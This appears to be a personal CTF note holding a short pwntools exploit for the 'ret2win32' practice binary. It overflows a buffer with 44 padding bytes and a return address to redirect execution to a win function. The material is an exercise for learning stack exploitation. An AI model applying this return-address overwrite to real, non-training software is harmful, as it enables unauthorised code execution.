# ret2win
  script
  '''
  #!/usr/bin/python3

  from pwn import *

  p = process("./ret2win32")

  junkdata = b"A" * 44
  addr = p32(0x08048645)

  payload = junkdata + addr
  
  p.sendline(payload)
  
  p.interactive()
  '''
